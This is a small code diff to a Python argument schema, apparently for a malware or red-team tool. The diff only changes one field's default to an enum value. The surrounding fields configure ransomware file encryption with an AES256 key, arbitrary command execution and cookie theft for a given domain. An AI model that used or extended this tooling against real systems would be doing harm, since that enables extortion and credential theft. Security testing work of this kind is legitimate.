@@ -29,6 +29,6 @@ class CommandArguments(BaseModel):
         default="", help="A list of directories to begin crawl from separated by a command (e.g.'C:\\,D:\\')"
     )
     ransomware_encryption_key: str = Field(default="", help="an encryption key used to encrypt each file identified (AES256)")
-    code_exec_command_type: CodeExecTypeEnum = Field(default="", help="Execution environment")
+    code_exec_command_type: CodeExecTypeEnum = Field(default=CodeExecTypeEnum.EMPTY, help="Execution environment")
     code_exec_command: str = Field(default="", help="A command to execute encoded as a string")
     steal_cookie_fqdn: str = Field(default="", help="fully qualified domain name to fetch the cookies of")
